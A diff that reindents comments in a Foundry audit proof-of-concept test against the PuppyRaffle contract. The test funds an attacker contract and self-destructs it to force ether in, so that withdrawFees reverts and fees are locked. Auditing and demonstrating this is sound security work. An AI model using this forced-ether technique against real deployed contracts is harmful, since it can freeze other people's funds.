@@ -42,36 +42,36 @@ contract Audit_PoC_Selfdestruct is Test {
     /////////////////////
 
     function testCanBreakWithdrawFees() public playersEntered {
-// DONE - 1. enterRaffle with entranceFee with the help of modifier playersEntered
+        // DONE - 1. enterRaffle with entranceFee with the help of modifier playersEntered
 
-// DONE - 2. console.log(address(this).balance) before pushing through self-destruct
+        // DONE - 2. console.log(address(this).balance) before pushing through self-destruct
         console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract before attack");
 
-// DONE - 3. Create an attackerContract instance and load with funds
+        // DONE - 3. Create an attackerContract instance and load with funds
         selfDestruct attackerContract = new selfDestruct(puppyRaffle);
         vm.deal(address(attackerContract), 10 ether);
         console.log(address(attackerContract).balance, "= Balance of Attacker contract");
         
-// DONE - 4. Push funds through self-destruct to the address(PuppyRaffle)
+        // DONE - 4. Push funds through self-destruct to the address(PuppyRaffle)
         vm.prank(playerOne);
         attackerContract.destroy();
 
-// 5. Test selectWinner(), so that totalFees != 0
+        // 5. Test selectWinner(), so that totalFees != 0
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
         puppyRaffle.selectWinner();
 
-// DONE - 5. console.log(address(this).balance)
+        // DONE - 5. console.log(address(this).balance)
         console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract after attack");
         console.log(puppyRaffle.totalFees(), "= PuppyRaffle totalFees currently");
         
-// DONE - 6. create a check for the next call to revert  
+        // DONE - 6. create a check for the next call to revert  
         vm.expectRevert("PuppyRaffle: There are currently players active!");
         vm.prank(playerOne);
 
-// DONE - 7. call puppyRaffle.withdrawFees()
+        // DONE - 7. call puppyRaffle.withdrawFees()
         puppyRaffle.withdrawFees();
-    }
+    } 
 }
 
 contract selfDestruct {
